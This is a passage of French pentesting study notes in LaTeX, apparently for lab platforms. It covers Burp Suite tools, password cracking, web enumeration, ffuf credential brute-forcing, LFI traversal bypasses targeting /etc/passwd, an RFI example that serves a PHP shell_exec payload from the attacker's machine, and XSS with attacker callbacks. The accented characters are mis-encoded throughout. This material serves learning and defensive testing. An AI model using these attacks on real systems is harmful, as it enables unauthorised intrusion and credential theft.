\\textbf{Historiques} : Les requÃªtes capturÃ©es peuvent Ãªtre visualisÃ©es dans les sous-onglets \\textit{HTTP history} et \\textit{WebSockets history}.

\\subsection{Options du Proxy}

AccÃ¨s via le bouton \\textit{Proxy settings}. Ces options fournissent un contrÃ´le Ã©tendu sur le comportement et les fonctionnalitÃ©s du Proxy.

\\subsubsection{Interception des RÃ©ponses}

Par dÃ©faut, le proxy n'intercepte pas les rÃ©ponses du serveur sauf demande explicite par requÃªte.

L'option \\textit{"Intercept responses based on the following rules"} avec les rÃ¨gles dÃ©finies permet une interception de rÃ©ponses plus flexible.

\\subsubsection{Match and Replace}

La section "Match and Replace" permet l'utilisation d'expressions rÃ©guliÃ¨res (regex) pour modifier les requÃªtes entrantes et sortantes de maniÃ¨re dynamique :

\\begin{itemize}
    \\item Modifier le user agent
    \\item Manipuler les cookies
    \\item Modifier automatiquement des headers
    \\item Remplacer des chaÃ®nes spÃ©cifiques
\\end{itemize}

\\subsection{Actions Contextuelles}

Clic droit sur une requÃªte pour :
\\begin{itemize}
    \\item Forward/Drop la requÃªte
    \\item Send to Repeater/Intruder/etc.
    \\item Copier l'URL
    \\item Ajouter au scope
    \\item Effectuer diverses actions spÃ©cifiques au contexte
\\end{itemize}

\\section{Burp Suite Repeater}

\\subsection{Objectif}

Repeater permet de manipuler et renvoyer les requÃªtes interceptÃ©es vers une cible. Les requÃªtes capturÃ©es dans Proxy peuvent Ãªtre Ã©ditÃ©es et envoyÃ©es de maniÃ¨re rÃ©pÃ©tÃ©e. Alternative graphique Ã  cURL pour crÃ©er des payloads et visualiser les rÃ©ponses.

\\subsection{Interface}

L'interface de Repeater se compose de six sections principales :

\\begin{itemize}
    \\item \\textbf{Request View} : Zone d'Ã©dition de la requÃªte
    \\item \\textbf{Response View} : Affichage de la rÃ©ponse du serveur
    \\item \\textbf{Target} : Informations sur la cible
    \\item \\textbf{Inspector} : Analyse dÃ©taillÃ©e de la requÃªte/rÃ©ponse
    \\item \\textbf{History} : Navigation dans l'historique des modifications
    \\item \\textbf{Send} : Bouton d'envoi de la requÃªte
\\end{itemize}

\\subsection{Utilisation}

\\textbf{Transfert depuis Proxy :}

Clic droit sur une requÃªte capturÃ©e > \\textit{Send to Repeater} ou \\monosp{Ctrl + R}

\\textbf{Modification et envoi :}

\\begin{enumerate}
    \\item Ã‰diter la requÃªte dans Request View
    \\item Cliquer sur \\textit{Send}
    \\item Observer la rÃ©ponse dans Response View
    \\item Utiliser les boutons historique pour naviguer entre versions
\\end{enumerate}

\\textbf{Exemple :} Modifier le header \\monosp{Connection: close} en \\monosp{Connection: open} gÃ©nÃ¨re une rÃ©ponse avec \\monosp{Connection: keep-alive}.

\\subsection{Options d'Affichage}

Quatre modes de visualisation disponibles pour les rÃ©ponses :

\\begin{itemize}
    \\item \\textbf{Pretty} : Formatage amÃ©liorÃ© pour lisibilitÃ© (par dÃ©faut)
    \\item \\textbf{Raw} : RÃ©ponse brute non formatÃ©e
    \\item \\textbf{Hex} : Vue octet par octet pour fichiers binaires
    \\item \\textbf{Render} : Rendu visuel comme dans un navigateur
\\end{itemize}

\\textbf{CaractÃ¨res non-imprimables :} Le bouton \\monosp{\\textbackslash n} affiche les caractÃ¨res invisibles comme \\monosp{\\textbackslash r\\textbackslash n} (carriage return + newline).

\\subsection{Inspector}

Breakdown visuel organisÃ© des composants de requÃªte/rÃ©ponse. Disponible en Proxy et Repeater.

\\textbf{Sections modifiables :}

\\begin{itemize}
    \\item \\textbf{Request Attributes} : Location, mÃ©thode HTTP, protocole (HTTP/1, HTTP/2)
    \\item \\textbf{Request Query Parameters} : DonnÃ©es GET envoyÃ©es via URL (ex: \\monosp{?redirect=false})
    \\item \\textbf{Request Body Parameters} : DonnÃ©es POST spÃ©cifiques aux requÃªtes POST
    \\item \\textbf{Request Cookies} : Liste modifiable des cookies
    \\item \\textbf{Request Headers} : Ajout, modification, suppression de headers
    \\item \\textbf{Response Headers} : Consultation uniquement (non modifiable)
\\end{itemize}

Le format tabulaire d'Inspector facilite l'expÃ©rimentation et la comprÃ©hension de l'impact des modifications sur la version brute de la requÃªte.

\\section{Burp Suite Intruder}

\\subsection{Objectif}

Intruder est l'outil de fuzzing intÃ©grÃ© de Burp Suite permettant la modification automatique de requÃªtes et les tests rÃ©pÃ©titifs avec variations de valeurs. Comparable Ã  \\monosp{Wfuzz} ou \\monosp{ffuf}, il permet :

\\begin{itemize}
    \\item Brute-force de formulaires de connexion avec wordlists
    \\item Fuzzing de sous-rÃ©pertoires, endpoints ou virtual hosts
    \\item Tests automatisÃ©s avec valeurs dÃ©finies par l'utilisateur
\\end{itemize}

\\textbf{Limitation Community :} Vitesse fortement rÃ©duite par rate-limiting (vs Professional).

\\subsection{Interface et Sous-onglets}

\\textbf{Positions} : SÃ©lection du type d'attaque et configuration des emplacements d'insertion des payloads dans le template de requÃªte.

\\textbf{Payloads} : SÃ©lection des valeurs Ã  insÃ©rer (wordlists, etc.). Configuration du comportement :
\\begin{itemize}
    \\item RÃ¨gles de prÃ©-traitement (ajout prÃ©fixe/suffixe, match and replace)
    \\item Exclusion basÃ©e sur regex
\\end{itemize}

\\textbf{Resource Pool} : (Professional uniquement) Allocation de ressources entre tÃ¢ches automatisÃ©es.

\\textbf{Settings} : Configuration du comportement d'attaque. Gestion des rÃ©sultats et rÃ©ponses (flagging de texte spÃ©cifique, traitement des redirections 3xx).

\\subsection{Configuration des Positions}

Burp Suite identifie automatiquement les positions probables (surlignÃ©es en vert, encadrÃ©es par Â§).

\\textbf{Boutons de gestion :}
\\begin{itemize}
    \\item \\textbf{Add Â§} : Ajouter manuellement une position (sÃ©lectionner + cliquer)
    \\item \\textbf{Clear Â§} : Supprimer toutes les positions dÃ©finies
    \\item \\textbf{Auto Â§} : RÃ©-identifier automatiquement les positions probables
\\end{itemize}

\\subsection{Configuration des Payloads}

Quatre sections principales dans l'onglet Payloads :

\\textbf{1. Payload Sets :}
\\begin{itemize}
    \\item Choix de la position et du type de payload
    \\item Un seul set pour Sniper/Battering Ram
    \\item Multiple sets pour Pitchfork/Cluster Bomb (ordre : haut-bas, gauche-droite)
\\end{itemize}

\\textbf{2. Payload Settings :}

Options spÃ©cifiques au type sÃ©lectionnÃ©. Pour "Simple list" :
\\begin{itemize}
    \\item Ajout manuel (Add text box)
    \\item Collage de lignes (Paste lines)
    \\item Chargement depuis fichier (attention aux listes volumineuses)
\\end{itemize}

\\textbf{3. Payload Processing :}

RÃ¨gles appliquÃ©es Ã  chaque payload avant envoi :
\\begin{itemize}
    \\item Capitalisation
    \\item Exclusion par regex
    \\item Transformations diverses
\\end{itemize}

\\textbf{4. Payload Encoding :}

Personnalisation de l'encodage. URL-encoding actif par dÃ©faut pour transmission sÃ©curisÃ©e. PossibilitÃ© de modifier la liste de caractÃ¨res encodÃ©s ou dÃ©sactiver l'option.

\\subsection{Types d'Attaque}

\\subsubsection{Sniper}

Type par dÃ©faut. ItÃ¨re linÃ©airement Ã  travers les payloads, un Ã  la fois dans chaque position.

\\begin{center}
\\begin{tabular}{|c|c|}
\\hline
\\textbf{Position} & \\textbf{Payload Set} \\\\
\\hline
username & $n_1$ payloads \\\\
password & $n_1$ payloads \\\\
\\hline
\\multicolumn{2}{|c|}{RequÃªtes : $n_1 \\times 2$} \\\\
\\hline
\\end{tabular}
\\end{center}

\\textbf{Calcul :} Wordlist de \\monosp{n} payloads sur \\monosp{p} positions $\\rightarrow$ \\monosp{n Ã— p} requÃªtes.

\\textbf{Usage :} Attaques single-position (brute-force passwords, fuzzing endpoints API).

\\subsubsection{Battering Ram}

Place le mÃªme payload simultanÃ©ment dans toutes les positions.

\\begin{center}
\\begin{tabular}{|c|c|}
\\hline
\\textbf{Position} & \\textbf{Payload Set} \\\\
\\hline
username & $n_1$ payloads \\\\
password & $n_1$ payloads (mÃªme) \\\\
\\hline
\\multicolumn{2}{|c|}{RequÃªtes : $n_1$} \\\\
\\hline
\\end{tabular}
\\end{center}

\\textbf{Calcul :} Wordlist de \\monosp{n} payloads $\\rightarrow$ \\monosp{n} requÃªtes (positions multiples).

\\textbf{Usage :} Test du mÃªme payload contre plusieurs positions simultanÃ©ment, tests de race conditions.

\\subsubsection{Pitchfork}

Utilise un payload set par position (max 20). ItÃ¨re simultanÃ©ment Ã  travers tous les sets.

\\begin{center}
\\begin{tabular}{|c|c|}
\\hline
\\textbf{Position} & \\textbf{Payload Set} \\\\
\\hline
username & $n_1$ payloads \\\\
password & $n_2$ payloads \\\\
\\hline
\\multicolumn{2}{|c|}{RequÃªtes : $\\min(n_1, n_2)$} \\\\
\\hline
\\end{tabular}
\\end{center}

\\textbf{Calcul :} Sets de tailles $n_1, n_2, ..., n_p$ $\\rightarrow$ $\\min(n_1, n_2, ..., n_p)$ requÃªtes.

\\textbf{Important :} S'arrÃªte quand le set le plus court est Ã©puisÃ©. IdÃ©al avec sets de mÃªme longueur.

\\textbf{Usage :} Credential stuffing, positions multiples avec sets distincts.

\\subsubsection{Cluster Bomb}

Teste toutes les combinaisons possibles de tous les payload sets.

\\begin{center}
\\begin{tabular}{|c|c|}
\\hline
\\textbf{Position} & \\textbf{Payload Set} \\\\
\\hline
username & $n_1$ payloads $\\times$ $n_2$ fois \\\\
password & $n_2$ payloads $\\times$ $n_1$ fois \\\\
\\hline
\\multicolumn{2}{|c|}{RequÃªtes : $n_1 \\times n_2$} \\\\
\\hline
\\end{tabular}
\\end{center}

\\textbf{Calcul :} Sets de tailles $n_1, n_2, ..., n_p$ $\\rightarrow$ $n_1 \\times n_2 \\times ... \\times n_p$ requÃªtes.

\\textbf{Attention :} GÃ©nÃ¨re un trafic important. Avec Community et rate-limiting, les attaques avec sets volumineux sont trÃ¨s longues.

\\textbf{Usage :} Brute-force de credentials sans mapping connu username/password.

\\subsection{Credential Stuffing avec CSRF et Macro}

Contexte : certaines applications gÃ©nÃ¨rent des tokens CSRF (champs cachÃ©s) et cookies de session dynamiques Ã  chaque requÃªte. Pour automatiser une attaque par Intruder, il faut extraire ces valeurs Ã  chaque tentative via un macro.

\\textbf{Principe :} Le macro effectue une requÃªte GET vers la page de login pour rÃ©cupÃ©rer un token/cookie frais, puis Intruder utilise ces valeurs dans chaque tentative de brute-force.

\\textbf{Configuration Intruder :}
\\begin{itemize}
    \\item Capturer la requÃªte POST de login, \\textit{Send to Intruder}
    \\item Attack type : Pitchfork ; positions sur les champs d'authentification uniquement (ex: username, password)
    \\item Ne pas marquer les positions du token CSRF ni des cookies (gÃ©rÃ©s par le macro)
    \\item Charger les wordlists appropriÃ©es
\\end{itemize}

\\textbf{CrÃ©er le macro (Settings > Sessions > Macros) :}
\\begin{itemize}
    \\item \\textit{Add} $\\rightarrow$ sÃ©lectionner une requÃªte GET vers la page de login
    \\item Donner un nom descriptif au macro
\\end{itemize}

\\textbf{Session Handling Rule :}
\\begin{itemize}
    \\item Ajouter une rÃ¨gle, onglet Details : \\textit{Run a macro} $\\rightarrow$ choisir le macro crÃ©Ã©
    \\item Restreindre les remplacements : cocher "Update only the following parameters" (ex: csrf\\_token, loginToken) et "Update only the following cookies" (ex: session, PHPSESSID)
    \\item Onglet Scope : Tools Scope = Intruder uniquement ; URL Scope = cible visÃ©e
\\end{itemize}

\\textbf{Validation :}
\\begin{itemize}
    \\item Codes de statut uniformes (302, 200) indiquent un macro fonctionnel
    \\item Codes 403/401 systÃ©matiques = macro mal configurÃ© ou tokens non extraits
    \\item Trier par longueur de rÃ©ponse pour identifier les credentials valides
\\end{itemize}

\\section{Burp Suite Decoder}

\\subsection{Objectif}

Decoder permet la manipulation de donnÃ©es via encodage, dÃ©codage et hachage. Utile pour transformer les donnÃ©es interceptÃ©es ou prÃ©parer des payloads avant envoi.

\\subsection{Interface}

L'interface se compose de :

\\begin{itemize}
    \\item \\textbf{Input} : Zone de saisie pour les donnÃ©es Ã  traiter (texte ou hexadÃ©cimal)
    \\item \\textbf{Format} : Choix entre traitement en texte ou en valeurs hexadÃ©cimales
    \\item \\textbf{Transformations} : Menus dÃ©roulants pour encoder, dÃ©coder ou hasher
    \\item \\textbf{Smart Decode} : DÃ©codage automatique rÃ©cursif jusqu'au plaintext
\\end{itemize}

Les transformations s'empilent : chaque opÃ©ration gÃ©nÃ¨re une nouvelle sortie utilisable pour d'autres transformations.

\\subsection{MÃ©thodes d'Encodage/DÃ©codage}

\\textbf{URL} : Substitue les caractÃ¨res par leur code ASCII hexadÃ©cimal prÃ©cÃ©dÃ© de \\monosp{\\%}. Exemple : \\monosp{/} devient \\monosp{\\%2F}.

\\textbf{HTML} : Remplace les caractÃ¨res spÃ©ciaux par des entitÃ©s HTML (ex: \\monosp{\\&\\#x42;} pour "B"). PrÃ©vient les attaques XSS.

\\textbf{Base64} : Convertit les donnÃ©es en format ASCII-compatible. MÃ©thode d'encodage trÃ¨s courante.

\\textbf{ASCII Hex} : Convertit entre reprÃ©sentations ASCII et hexadÃ©cimales. Exemple : "ASCII" $\\rightarrow$ "4153434949".

\\textbf{Hex, Octal, Binary} : Conversions entre reprÃ©sentations numÃ©riques (dÃ©cimal, hexadÃ©cimal, octal, binaire).

\\textbf{Gzip} : Compression de donnÃ©es. RÃ©duit la taille des fichiers avant transmission.

\\subsection{Vue HexadÃ©cimale}

Le mode \\textit{Hex View} permet l'Ã©dition byte-par-byte en format hexadÃ©cimal. Essentiel pour travailler avec des fichiers binaires ou donnÃ©es non-ASCII.

\\subsection{Hachage}

Decoder gÃ©nÃ¨re des hashsums pour vÃ©rifier l'intÃ©gritÃ© des donnÃ©es :

\\begin{itemize}
    \\item Menu \\textit{Hash} : sÃ©lection de l'algorithme (MD5, SHA-256, etc.)
    \\item Sortie automatique en vue hexadÃ©cimale
    \\item Encodage ASCII Hex pour obtenir une chaÃ®ne hex lisible
\\end{itemize}

\\textbf{Note :} Le hachage est unidirectionnel et irrÃ©versible. UtilisÃ© pour stocker les mots de passe ou vÃ©rifier l'intÃ©gritÃ© des fichiers.

\\section{Burp Suite Comparer}

Permet la comparaison de deux ensembles de donnÃ©es au niveau des mots ou des octets. Utile pour identifier les diffÃ©rences entre requÃªtes/rÃ©ponses.

\\textbf{Chargement} : \\textit{Paste}, \\textit{Load} ou \\textit{Send to Comparer}.

\\textbf{Comparaison} : SÃ©lectionner deux datasets puis cliquer sur \\textit{Words} ou \\textit{Bytes}. Affichage cÃ´te-Ã -cÃ´te avec code couleur (ajoutÃ©/supprimÃ©/modifiÃ©).

\\section{Burp Suite Sequencer}

\\subsection{Objectif}

Sequencer Ã©value l'entropie (alÃ©atoire) des tokens gÃ©nÃ©rÃ©s par l'application. Les tokens (cookies de session, tokens CSRF) doivent Ãªtre cryptographiquement sÃ©curisÃ©s pour empÃªcher leur prÃ©diction.

\\subsection{Modes d'Analyse}

\\textbf{Live Capture} : Envoie automatiquement la mÃªme requÃªte des milliers de fois pour collecter des Ã©chantillons de tokens. Mode par dÃ©faut et le plus utilisÃ©.

\\textbf{Manual Load} : Charge une liste prÃ©-gÃ©nÃ©rÃ©e de tokens pour analyse. Moins bruyant mais nÃ©cessite des Ã©chantillons existants.

\\subsection{Configuration Live Capture}

\\textbf{1) Envoi de la requÃªte :}

Capturer une requÃªte gÃ©nÃ©rant un token (ex: GET vers page de login) > \\textit{Send to Sequencer}.

\\textbf{2) SÃ©lection du token :}

Dans "Token Location Within Response" :
\\begin{itemize}
    \\item \\textbf{Cookie} : Pour les cookies de session
    \\item \\textbf{Form field} : Pour les champs de formulaire (ex: loginToken)
    \\item \\textbf{Custom location} : Localisation manuelle
\\end{itemize}

\\textbf{3) Capture :}

\\begin{itemize}
    \\item Cliquer sur \\textit{Start live capture}
    \\item Attendre $\\sim$10,000 tokens (plus = meilleure prÃ©cision)
    \\item \\textit{Pause} puis \\textit{Analyze now} (ou \\textit{Auto analyze} pour analyse pÃ©riodique)
\\end{itemize}

\\subsection{Rapport d'Analyse}

\\textbf{Overall result} : Ã‰valuation globale de la sÃ©curitÃ© de gÃ©nÃ©ration des tokens.

\\textbf{Effective entropy} : Mesure de l'alÃ©atoire en bits. Valeur Ã©levÃ©e ($>$100 bits) = tokens sÃ©curisÃ©s.

\\textbf{Reliability} : Niveau de confiance (ex: 1\\% = 99\\% de confiance).

\\textbf{Sample} : DÃ©tails sur les Ã©chantillons analysÃ©s (nombre, caractÃ©ristiques).

\\textbf{Analyses dÃ©taillÃ©es} : Character-level et bit-level analysis pour investigations approfondies si nÃ©cessaire.

\\textbf{Note :} Un rapport favorable indique une gÃ©nÃ©ration sÃ©curisÃ©e mais ne garantit pas l'absence totale de vulnÃ©rabilitÃ©s.

\\section{Burp Suite Organizer}

\\subsection{Objectif}

Organizer permet de stocker et annoter des copies de requÃªtes HTTP pour consultation ultÃ©rieure. Utile pour organiser le workflow de pentesting et prÃ©parer les rapports.

\\subsection{FonctionnalitÃ©s}

\\textbf{Stockage de requÃªtes} :
\\begin{itemize}
    \\item RequÃªtes Ã  investiguer plus tard
    \\item RequÃªtes identifiÃ©es comme intÃ©ressantes
    \\item RequÃªtes destinÃ©es aux rapports
\\end{itemize}

\\textbf{Envoi vers Organizer} : Clic droit sur une requÃªte > \\textit{Send to Organizer} ou \\monosp{Ctrl + O}. CrÃ©e une copie read-only au moment de l'envoi.

\\subsection{Interface}

Les requÃªtes sont affichÃ©es dans un tableau avec colonnes :

\\begin{itemize}
    \\item \\textbf{Index} : NumÃ©ro de requÃªte
    \\item \\textbf{Time} : Horodatage
    \\item \\textbf{Workflow status} : Statut de traitement
    \\item \\textbf{Tool} : Module Burp source (Proxy, Repeater, etc.)
    \\item \\textbf{Method} : MÃ©thode HTTP (GET, POST, etc.)
    \\item \\textbf{Hostname} : Serveur cible
    \\item \\textbf{Path} : Chemin URL
    \\item \\textbf{Query} : Query string
    \\item \\textbf{Parameters} : Nombre de paramÃ¨tres
    \\item \\textbf{Status} : Code de statut HTTP
    \\item \\textbf{Length} : Taille de la rÃ©ponse en bytes
    \\item \\textbf{Notes} : Annotations personnelles
\\end{itemize}

\\subsection{Consultation}

Cliquer sur un item pour visualiser la requÃªte et sa rÃ©ponse en mode lecture seule. Fonction de recherche disponible dans les barres sous la requÃªte/rÃ©ponse.

\\newpage


\\chapter{Cryptographie}

\\section{Crackstation}

\\textbf{Crackstation} : \\url{https://crackstation.net/}

Permet de retrouver la chaÃ®ne d'origine d'un hash.

\\section{Password Cracking}

\\subsection{Attaques Principales}

\\textbf{Dictionary Attacks} : Utilisation de wordlists prÃ©dÃ©finies (\\monosp{rockyou.txt}, \\monosp{common-passwords.txt}). Rapide et efficace contre les mots de passe courants.

\\textbf{Mask Attacks} : Attaques limitÃ©es Ã  un format spÃ©cifique (ex: \\monosp{?l?l?l?d?d} = 3 lettres + 2 chiffres). Ã‰quilibre entre vitesse et exhaustivitÃ©.

\\subsection{Outils Courants}

\\begin{itemize}
    \\item \\textbf{PDF} : \\monosp{pdfcrack}, \\monosp{john} (via \\monosp{pdf2john})
    \\item \\textbf{ZIP} : \\monosp{fcrackzip}, \\monosp{john} (via \\monosp{zip2john})
    \\item \\textbf{GÃ©nÃ©raliste} : \\monosp{john}, \\monosp{hashcat} (GPU)
\\end{itemize}

\\subsection{Processus}

\\cmd{pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt}

\\cmd{zip2john flag.zip > ziphash.txt}

\\cmd{john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt}

\\subsection{DÃ©tection}

\\textbf{Binaires} : john, hashcat, fcrackzip, pdfcrack, zip2john.

\\textbf{Indicateurs} : Arguments \\monosp{--wordlist}, \\monosp{-w}, \\monosp{--mask}; fichiers \\monosp{\\textasciitilde/.john/john.pot}, \\monosp{.hashcat/hashcat.potfile}.

\\textbf{GPU} : Utilisation Ã©levÃ©e de GPU avec processus hashcat ou john, bibliothÃ¨ques \\monosp{nvcuda.dll}, \\monosp{libcuda.so}.

\\newpage
\\chapter{Phishing}
\\section{Social Engineer ToolKit}
ToolKit trop fort : \\url{https://github.com/trustedsec/social-engineer-toolkit}\\\\
Mass Mailer peut envoyer des mails avec n'importe quel email

\\newpage
\\chapter{Web}

\\section{Website Discovery}

\\subsection{Tech Stack Discovery}

\\subsubsection{Websites Tools - Website Info}

\\textbf{Wappalyzer} : \\url{https://www.wappalyzer.com/}

Donne la tech stack d'un site web.

\\textbf{WayBack Machine} : \\url{https://web.archive.org/}

Donne les archives du nom de domaine.

\\subsubsection{Divers}

\\textbf{FavIcon Framework} : Dans le HEAD de l'HTML, on peut trouver la rÃ©fÃ©rence du favicon, qui indique le framework et sa version (failles possibles).

RÃ©fÃ©rence : \\url{https://wiki.owasp.org/index.php/OWASP_favicon_database}

\\subsubsection{HTTP}

\\textbf{Headers} : 

\\cmd{curl URL -v}

Donne des infos comme le type de serveur web et sa version.

\\subsection{Page/Subdomain Discovery}

\\subsubsection{Fichiers}

\\begin{itemize}
    \\item \\textbf{Robots.txt} : Fichier pour les robots, contient parfois des routes secrÃ¨tes
    \\item \\textbf{Sitemap.xml} : Fichier de plan du site, contient les routes autorisÃ©es mais parfois obsolÃ¨te
\\end{itemize}

\\subsubsection{CT Logs}

Logs gÃ©nÃ©rÃ©s quand un domaine est authentifiÃ© par certificat SSL (BD logs : \\monosp{crt.sh}).

\\subsubsection{Automated Discovery}

\\textbf{Sous-Domaines}

\\textbf{DNS recon} : Ã©numÃ¨re les subdomains

\\cmd{dnsrecon -t brt -d acmeitsupport.thm}

\\textbf{Sublist3r} : mÃªme chose en plus rapide

\\cmd{./sublist3r.py -d acmeitsupport.thm}

\\textbf{ffuf} : Ã©numÃ¨re, mais doit Ãªtre filtrÃ© niveau taille

Ã‰tapes :
\\begin{enumerate}
    \\item Commande sans \\monosp{-fs size}
    \\item Commande avec \\monosp{-fs size} en remplaÃ§ant size par la taille gÃ©nÃ©rique
\\end{enumerate}

\\cmd{ffuf -w /PathToNameList/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.80.176.7 -fs \\{size\\}}

\\textbf{Pages}

\\textbf{ffuf} : Ã©numÃ¨re les pages

\\cmd{ffuf -w /pathToWordList/common.txt -u http://10.80.177.30/FUZZ}

\\textbf{dirb} :

\\cmd{dirb http://10.80.177.30/ /pathToWordList/common.txt}

\\textbf{gobuster} :

\\cmd{gobuster dir --url http://10.80.177.30/ -w /pathToWordList/common.txt}

\\section{HTTP Requests avec cURL}

\\textbf{cURL} est un outil en ligne de commande pour crÃ©er des requÃªtes HTTP et visualiser les rÃ©ponses brutes. IdÃ©al pour tester des applications web sans navigateur.

\\subsection{Commandes de base}

\\textbf{RequÃªte GET :}

\\cmd{curl http://site.com}

\\textbf{RequÃªte POST :}

\\cmd{curl -X POST -d "username=admin\\&password=pass" http://site.com/login}

\\textbf{Options principales :}
\\begin{itemize}
    \\item \\monosp{-X POST} : mÃ©thode POST
    \\item \\monosp{-d "data"} : donnÃ©es du body (URL-encoded)
    \\item \\monosp{-i} : afficher les headers de rÃ©ponse
    \\item \\monosp{-s} : mode silencieux (pas de progression)
\\end{itemize}

\\subsection{Gestion des Cookies}

\\textbf{Sauvegarder les cookies :}

\\cmd{curl -c cookies.txt -d "username=admin\\&password=pass" http://site.com/login}

\\textbf{RÃ©utiliser les cookies :}

\\cmd{curl -b cookies.txt http://site.com/dashboard}

Permet de maintenir une session active entre plusieurs requÃªtes.

\\subsection{Automatisation}

Possible de scripter cURL pour du brute-force ou des tests automatisÃ©s :
\\begin{itemize}
    \\item Lire une wordlist avec \\monosp{for pass in \\$(cat wordlist.txt)}
    \\item Envoyer une requÃªte pour chaque entrÃ©e
    \\item Analyser la rÃ©ponse avec \\monosp{grep} pour dÃ©tecter le succÃ¨s
\\end{itemize}

Cette mÃ©thode est la base d'outils comme Hydra, Burp Intruder et WFuzz.

\\subsection{Bypass User-Agent}

Certaines applications bloquent cURL via le header User-Agent.

\\textbf{SpÃ©cifier un User-Agent personnalisÃ© :}

\\cmd{curl -A "Mozilla/5.0" http://site.com}

\\section{ConfidentialitÃ©}

\\subsection{Enumeration}

\\subsubsection{Username Enumeration}

\\textbf{ffuf} : permet l'Ã©numÃ©ration d'username en filtrant les rÃ©ponses de requÃªtes

\\cmd{ffuf -w /PathToWordList/names.txt -X POST -d "username=FUZZ\\&email=x\\&password=x\\&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.189.140/customers/signup -mr "username already exists"}

\\subsubsection{BruteForce}

\\textbf{ffuf} : permet de bruteforcer des username via Ã©numÃ©ration

\\cmd{ffuf -w valid\\_usernames.txt:W1,/PathToPasswordFile/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1\\&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.189.140/customers/login -fc 200}

\\subsection{Cookie Tampering}

\\subsubsection{Cookies}

DÃ©finir les cookies avec un Curl sur les sites peu sÃ©curisÃ©s peut fonctionner, mÃªme s'il est hashÃ© :

\\cmd{curl -H "Cookie: session=abc123; theme=dark" http://site.com}

\\subsection{IDOR}

\\paragraph{DÃ©finition :} Insecure Direct Object Reference \\\\
LÃ©ger abus de langage, mais le concept c'est que une fois authentifiÃ©, le serveur ne va pas vÃ©rifier si les donnÃ©es que nous demandons sont les notres, (\\textbf{HORIZONTAL} privilege escalation).\\\\
La condition est donc de trouver le point d'entrÃ©e ou on ne verifie pas cette entrÃ©e, par exemple une URL : \\monosp{/details.php?user=2}).\\\\
les failles \\textbf{IDOR} peuvent etre bien camouflÃ©es, par exemple avec l'ID hashÃ©, encodÃ© en base64, mais a partir du moment ou c'est pas check niveau serveur, c'est pas safe.
\\paragraph{Spotting :}
Pour voir si faille IDOR : crÃ©er 2 comptes et Ã©changer les ID dans les requÃªtes.

\\subsection{UUID Determinism}
Les UUID (ou du moins certaines version) sont dÃ©triministiques, c'est a dire qu'avec suffisament d'info on peut en recrÃ©er/en deviner :
\\url{https://www.uuidtools.com/decode} permet de dÃ©coder les UUID

\\section{File Inclusion}

\\paragraph{DÃ©finition :}
Quand un serveur web peut \\monosp{include()} des fichiers, on va tenter de modifier le chemin d'accÃ¨s pour avoir accÃ¨s Ã  d'autres fichiers. Si les permissions sont mal gÃ©rÃ©es, on va pouvoir acceder a des fichiers compromettants/effectuer une \\textbf{RCE}

\\subsection{Directory Traversal}
C'est plus un Trick qu'autre chose mais c'est necessaire pour le \\textbf{LFI}, le concept est de se deplacer dans une arborescence de fichier en utilisant \\monosp{../../../} dans un nom de fichier.

\\subsection{Local File Inclusion}
File Inclusion en local, c'est a dire on va essayer d'\\textbf{include()} les fichiers qui sont dÃ©ja sur le serveur. Par exemple avec un formulaire/une url qui rÃ©cupere du code php sur le serveur\\\\


\\paragraph{Filtre extension\\\\}

Si on a une sÃ©curitÃ© dans le nom du fichier (par exemple s'il doit finir par \\monosp{.php} pour Ãªtre renvoyÃ©), on peut utiliser le null byte pour annuler la fin de string : \\monosp{\\%00} (fonctionne jusqu'Ã  PHP 5.3.4).

\\paragraph{Filtre keywords\\\\}

Si il y a un filtre strict de keywords, on peut faire \\monosp{dir/file/.} qui renvoie \\monosp{file}.

\\paragraph{Filtre ../\\\\}

Si la string \\monosp{../} est filtrÃ©e, on peut la doubler : \\monosp{....//....//....//....//....//etc/passwd} et par concatÃ©nation Ã§a va reformer le bon chemin.

\\paragraph{Filtre parfait\\\\}

Il reste une autre mÃ©thode : si le site utilise \\monosp{\\$\\_REQUEST}, on peut directement dÃ©finir Ã§a via un curl (\\monosp{file=/../../../../etc/passwd}).

\\subsection{Remote File Inclusion}

Cette fois, on utilise des fichiers externes pour attaquer le serveur, en forcant le serveur a load du php malveillant par exemple.\\\\
Implique que \\monosp{allow\\_url\\_fopen} soit activÃ©.

\\textbf{Exemple :}

\\textbf{1) CrÃ©er le fichier PHP suivant sur notre machine :}

\\begin{codebox}{exploit.php}
\\begin{lstlisting}[language=PHP]
<?php echo shell_exec("hostname"); ?>
\\end{lstlisting}
\\end{codebox}

Ce dernier exÃ©cute la commande \\monosp{hostname} (remplaÃ§able par autre chose).

\\textbf{2) CrÃ©er un serveur web pour l'hÃ©berger :}

\\cmd{python3 -m http.server 80}

\\textbf{3)} On met l'URL de notre serveur dans l'input du site, Ã§a va exÃ©cuter la commande si il y a bien \\monosp{include()}.

\\section{Failles XSS (Cross Site Scripting)}

\\paragraph{DÃ©finition :} Cross Site Scripting\\\\
ExÃ©cuter du code JavaScript sur le serveur/compte d'un autre utilisateur en injectant du code (payload) dans des donnÃ©es qui vont Ãªtre affichÃ©es sur un site. Le plus souvent on y ajoute un CallBack (\\monosp{GET monIp.com}) qui permet de rÃ©cupÃ©rer les infos (keylogger, rÃ©cup cookies auth, etc.).

\\subsection{Types de XSS}

\\subsubsection{Reflected XSS}

Dans le cas oÃ¹ on peut jouer avec la queryString, on peut y injecter du code.

Exemple : un site web qui affiche "bonjour USER" Ã  l'adresse \\urlcode{siteweb.com/user=USER} peut Ãªtre utilisÃ© avec \\urlcode{siteweb.com/user=<script>...</script>}.

\\subsubsection{Stored XSS}

Est utilisÃ© si le payload peut Ãªtre stockÃ© dans une BD, par exemple un commentaire sur une publication qui contient \\monosp{<script>...</script>}.

\\subsubsection{DOM Based}

Plus rare, mais si la page accÃ¨de Ã  des Ã©lÃ©ments du DOM du site et qu'on a accÃ¨s Ã  ces Ã©lÃ©ments, on peut y injecter du code (par exemple un site qui vÃ©rifie la version du navigateur et on la change Ã  \\monosp{<script>...</script>}).

\\subsubsection{Blind XSS}

TrÃ¨s similaire au Stored XSS Ã  la seule diffÃ©rence qu'on ne voit pas ce qui se passe (Ã  destination du staff).

\\subsection{SÃ©curitÃ© et Bypass}

